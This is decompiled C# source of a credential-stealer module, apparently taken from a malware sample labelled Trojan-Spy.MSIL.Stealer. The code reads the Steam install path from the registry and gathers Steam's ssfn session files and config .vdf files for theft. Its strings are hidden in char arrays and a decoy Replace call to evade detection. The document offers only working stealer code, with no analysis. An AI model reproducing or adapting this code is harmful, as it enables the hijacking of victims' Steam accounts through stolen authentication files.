// Decompiled with JetBrains decompiler
// Type: dnlibDotNetFileDefMDcDisplayClassv
// Assembly: Pursuits, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5AE29391-E6B0-4A11-8563-A9AF244B152D
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan-Spy.MSIL.Stealer.gen-f5d5176d0ac8a6c9093f39208d3aff397cce06017bbf0f2e4fee86a5ce09a398.exe

using Microsoft.Win32;
using System.Collections.Generic;
using System.IO;

public class dnlibDotNetFileDefMDcDisplayClassv : MicrosoftWinNativeMethodsMEMORYBASICINFORMATIONd
{
  public override string Id2(SystemDataXSDSchemaNameTypeE scannerArg, FileInfo fileInfo)
  {
    try
    {
      if (scannerArg.Id1.Contains(new string(new char[6]
      {
        'c',
        'o',
        'n',
        'f',
        'i',
        'g'
      })))
        return new string(new char[6]
        {
          'c',
          'o',
          'n',
          'f',
          'i',
          'g'
        });
    }
    catch
    {
    }
    return string.Empty;
  }

  public override IEnumerable<SystemDataXSDSchemaNameTypeE> Id3()
  {
    List<SystemDataXSDSchemaNameTypeE> xsdSchemaNameTypeEList = new List<SystemDataXSDSchemaNameTypeE>();
    try
    {
      RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(new string(new char[20]
      {
        'S',
        'o',
        'f',
        't',
        'w',
        'a',
        'r',
        'e',
        '\\',
        'V',
        'a',
        'l',
        'v',
        'e',
        '\\',
        'S',
        't',
        'e',
        'a',
        'm'
      }));
      if (registryKey == null)
        return (IEnumerable<SystemDataXSDSchemaNameTypeE>) xsdSchemaNameTypeEList;
      string str = registryKey.GetValue(new string(new char[9]
      {
        'S',
        't',
        'e',
        'a',
        'm',
        'P',
        'a',
        't',
        'h'
      })) as string;
      if (!Directory.Exists(str))
        return (IEnumerable<SystemDataXSDSchemaNameTypeE>) xsdSchemaNameTypeEList;
      xsdSchemaNameTypeEList.Add(new SystemDataXSDSchemaNameTypeE()
      {
        Id1 = str,
        Id2 = new string(new char[6]
        {
          '*',
          's',
          's',
          'f',
          'n',
          '*'
        }),
        Id3 = false
      });
      xsdSchemaNameTypeEList.Add(new SystemDataXSDSchemaNameTypeE()
      {
        Id1 = Path.Combine(str, new string(new char[6]
        {
          'c',
          'o',
          'n',
          'f',
          'i',
          'g'
        })),
        Id2 = new string(new char[19]
        {
          '*',
          '.',
          'v',
          's',
          't',
          'r',
          'i',
          'n',
          'g',
          '.',
          'R',
          'e',
          'p',
          'l',
          'a',
          'c',
          'e',
          'd',
          'f'
        }).Replace("string.Replace", string.Empty),
        Id3 = false
      });
    }
    catch
    {
    }
    return (IEnumerable<SystemDataXSDSchemaNameTypeE>) xsdSchemaNameTypeEList;
  }
}
